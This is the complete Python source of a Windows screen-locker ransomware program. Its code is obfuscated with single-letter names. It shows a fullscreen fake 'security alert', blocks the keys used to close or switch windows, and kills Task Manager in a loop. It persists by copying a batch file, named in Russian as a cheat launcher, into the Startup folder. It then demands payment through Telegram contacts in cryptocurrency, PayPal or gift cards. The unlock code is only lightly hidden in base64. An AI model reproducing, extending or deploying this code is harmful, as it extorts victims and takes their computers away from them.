import tkinter as tk
from tkinter import messagebox
import threading
import time
import base64
import winreg
import os
import glob
import pygame
from PIL import Image, ImageTk
import stat

class a:
    def __init__(self):
        self.b = tk.Tk()
        self.c()
        self.d()
        self.e()
        self.f()
        self.g()
        self.h()
        self.i()
        threading.Thread(target=self.block_taskmgr, daemon=True).start()
    def block_taskmgr(self):
        import subprocess
        while True:
            try:
                tasks = subprocess.check_output('tasklist', creationflags=0x08000000).decode(errors='ignore')
                if 'Taskmgr.exe' in tasks or 'taskmgr.exe' in tasks:
                    subprocess.call('taskkill /F /IM taskmgr.exe', creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
            time.sleep(1)
        
    def c(self):
        self.b.title("System Security Alert")
        self.b.configure(bg='#000000')
        self.b.attributes('-fullscreen', True)
        self.b.attributes('-topmost', True)
        self.b.protocol("WM_DELETE_WINDOW", lambda: None)
        self.b.bind('<Alt-F4>', lambda e: None)
        self.b.bind('<Control-Alt-Delete>', lambda e: None)
        self.b.bind('<Alt-Tab>', lambda e: None)
        self.b.bind('<Escape>', lambda e: None)
        self.b.bind('<Alt-Shift-KeyPress-c>', self.j)
        self.b.bind('<Alt-Shift-KeyPress-C>', self.j)
        self.b.focus_force()
        
    def d(self):
        try:
            pygame.mixer.init()
            k = glob.glob("Temp/Sound.*") + glob.glob("Temp/sound.*")
            if k:
                self.l = k[0]
            else:
                self.l = None
        except:
            self.l = None
            
    def g(self):
        try:
            if self.l and os.path.exists(self.l):
                pygame.mixer.music.load(self.l)
                pygame.mixer.music.play(-1)
        except:
            pass
            
    def e(self):
        try:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            img_path = os.path.join(script_dir, "Images", "123.jpg")
            m = Image.open(img_path)
            m = m.resize((self.b.winfo_screenwidth(), self.b.winfo_screenheight()))
            self.n = ImageTk.PhotoImage(m)
            o = tk.Label(self.b, image=self.n)
            o.place(x=0, y=0, relwidth=1, relheight=1)
        except:
            self.b.configure(bg='#0a0a0a')
        
        self.p = tk.Frame(self.b, bg='#000000', bd=5, relief='raised')
        self.p.place(relx=0.5, rely=0.5, anchor='center', width=820, height=750)

        self.q = tk.Frame(self.p, bg='#FF0000', bd=3, relief='solid')
        self.q.pack(fill='x', pady=20, padx=20)

        self.r = tk.Label(self.q, 
            text=" CRITICAL SYSTEM SECURITY ALERT ",
            font=('Arial', 22, 'bold'),
            fg='#FFFFFF', bg='#FF0000')
        self.r.pack(pady=15)

        s = tk.Frame(self.p, bg='#1a1a1a', bd=2, relief='solid')
        s.pack(fill='x', pady=15, padx=20)

        t = """ SYSTEM LOCKED - SECURITY VIOLATION DETECTED
\nYour computer has been locked due to suspicious activity.\nTo unlock your system, enter the security code below.\n\n For technical support or unlock key purchase:\n Telegram: @Beelh or @Daxelt\n Instant unlock available 24/7\n        """

        self.u = tk.Label(s,
            text=t,
            font=('Arial', 13),
            fg='#FFFFFF', bg='#1a1a1a',
            justify='center')
        self.u.pack(pady=20)

        self.v = tk.Frame(self.p, bg='#FF0000', bd=3, relief='solid')
        self.v.pack(pady=20, padx=20)

        self.w = tk.Label(self.v,
            text=" SYSTEM STATUS: LOCKED ",
            font=('Arial', 18, 'bold'),
            fg='#FFFFFF', bg='#FF0000')
        self.w.pack(pady=12, padx=30)

        x = tk.Frame(self.p, bg='#2a2a2a', bd=3, relief='solid')
        x.pack(pady=25, padx=20, fill='x')

        tk.Label(x,
            text=" ENTER SECURITY ACCESS CODE:",
            font=('Arial', 14, 'bold'),
            fg='#FFFF00', bg='#2a2a2a').pack(pady=20)

        y = tk.Frame(x, bg='#2a2a2a')
        y.pack(pady=15)

        self.z = tk.Entry(y,
            font=('Arial', 28, 'bold'),
            width=22,
            justify='center',
            show='*',
            bg='#222222',
            fg='#FFFF00',
            insertbackground='#FFFF00',
            bd=8,
            relief='solid',
            highlightthickness=3,
            highlightbackground='#FFFF00')
        self.z.pack(pady=20, ipady=12)
        self.z.bind('<Return>', self.aa)
        self.z.focus()

        bb = tk.Frame(x, bg='#2a2a2a')
        bb.pack(pady=25)

        self.cc = tk.Button(bb,
            text=" UNLOCK SYSTEM",
            font=('Arial', 16, 'bold'),
            fg='#000000', bg='#FFFF00',
            activebackground='#FFFF00',
            activeforeground='#000000',
            command=self.aa,
            width=20,
            bd=6,
            relief='raised',
            cursor='hand2')
        self.cc.pack(side='left', padx=16)

        self.dd = tk.Button(bb,
            text=" PURCHASE KEY",
            font=('Arial', 16, 'bold'),
            fg='#FFFFFF', bg='#FF8800',
            activebackground='#FF8800',
            activeforeground='#FFFFFF',
            command=self.ee,
            width=20,
            bd=6,
            relief='raised',
            cursor='hand2')
        self.dd.pack(side='right', padx=16)

        ff = tk.Frame(self.p, bg='#333333', bd=2, relief='solid')
        ff.pack(side='bottom', fill='x', pady=20, padx=20)

        self.gg = tk.Label(ff,
            text=" System ID: WIN-SYS-2908 | Status: LOCKED | Protection: ACTIVE",
            font=('Arial', 11),
            fg='#CCCCCC', bg='#333333')
        self.gg.pack(pady=12)
        
    def f(self):
        def hh():
            ii = ['#FF0000', '#FF3333', '#FF6666', '#FF9999', '#FFCCCC']
            jj = 0
            while True:
                try:
                    self.v.config(bg=ii[jj % len(ii)])
                    self.w.config(bg=ii[jj % len(ii)])
                    jj += 1
                    time.sleep(0.4)
                except:
                    break
        
        def kk():
            ll = [795, 800, 805, 800]
            mm = 0
            while True:
                try:
                    nn = ll[mm % len(ll)]
                    self.p.config(width=nn, height=600)
                    mm += 1
                    time.sleep(1.5)
                except:
                    break
        
        def oo():
            pp = [('#00AA00', '#00CC00'), ('#0066CC', '#0088CC')]
            qq = 0
            while True:
                try:
                    rr = pp[0][qq % 2]
                    ss = pp[1][qq % 2]
                    self.cc.config(bg=rr)
                    self.dd.config(bg=ss)
                    qq += 1
                    time.sleep(2.0)
                except:
                    break
        
        threading.Thread(target=hh, daemon=True).start()
        threading.Thread(target=kk, daemon=True).start()
        threading.Thread(target=oo, daemon=True).start()
        
    def aa(self, event=None):
        tt = self.z.get()
        uu = base64.b64decode('MjkwOA==').decode('utf-8')
        
        if tt == uu:
            self.vv()
        else:
            messagebox.showerror(" ACCESS DENIED", 
                               "Invalid security code!\n\n Contact @Beelh or @Daxelt for unlock key")
            self.z.delete(0, tk.END)
            
    def j(self, event=None):
        self.vv()
        
    def ee(self):
        ww = tk.Toplevel(self.b)
        ww.title("Purchase Unlock Key")
        ww.configure(bg='#1a1a1a')
        ww.geometry("500x400")
        ww.attributes('-topmost', True)
        ww.resizable(False, False)
        
        ww.transient(self.b)
        ww.grab_set()
        
        xx = tk.Label(ww,
                     text=" INSTANT UNLOCK KEY PURCHASE",
                     font=('Arial', 16, 'bold'),
                     fg='#FFFF00', bg='#1a1a1a')
        xx.pack(pady=25)
        
        yy = """ Get your unlock key in minutes!

 CONTACT ADMINISTRATORS:
 @Beelh - Primary support
 @Daxelt - Secondary support

 PAYMENT OPTIONS:
 Bitcoin/Cryptocurrency
 PayPal transfers  
 Bank card payments
 Steam gift cards

 INSTANT FEATURES:
 Immediate unlock code delivery
 24/7 customer support
 Money back guarantee
 Bulk discounts available

 SECURE & RELIABLE SERVICE
        """
        
        zz = tk.Label(ww,
                     text=yy,
                     font=('Arial', 11),
                     fg='#FFFFFF', bg='#1a1a1a',
                     justify='left')
        zz.pack(pady=15, padx=25)
        
        aaa = tk.Button(ww,
                       text="CLOSE WINDOW",
                       font=('Arial', 12, 'bold'),
                       command=ww.destroy,
                       bg='#FF4444', fg='#FFFFFF',
                       width=22)
        aaa.pack(pady=25)
            
    def vv(self):
        try:
            pygame.mixer.music.stop()
        except:
            pass
        self.ccc()
        self.ddd()
        messagebox.showinfo(" SYSTEM UNLOCKED", 
                          "Access granted successfully!\nSystem will unlock now.\n\nThank you!")
        self.b.destroy()
        
    def h(self):
        try:
            startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            current_dir = os.path.dirname(os.path.abspath(__file__))
            bat_source = os.path.join(current_dir, 'Запуск чита.bat')
            bat_destination = os.path.join(startup_path, 'Запуск чита.bat')
            if os.path.exists(bat_source):
                import shutil
                shutil.copy2(bat_source, bat_destination)
        except:
            pass
            
    def ccc(self):
        try:
            ggg = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                               0, winreg.KEY_WRITE)
            winreg.DeleteValue(ggg, "WindowsUpdate")
            winreg.CloseKey(ggg)
        except:
            pass
    
    def i(self):
        try:
            hhh = os.path.abspath(__file__)
            os.chmod(hhh, stat.S_IREAD)
        except:
            pass
    
    def ddd(self):
        try:
            iii = os.path.abspath(__file__)
            os.chmod(iii, stat.S_IWRITE | stat.S_IREAD)
        except:
            pass
            
    def run(self):
        self.b.mainloop()

if __name__ == "__main__":
    jjj = a()
    jjj.run()
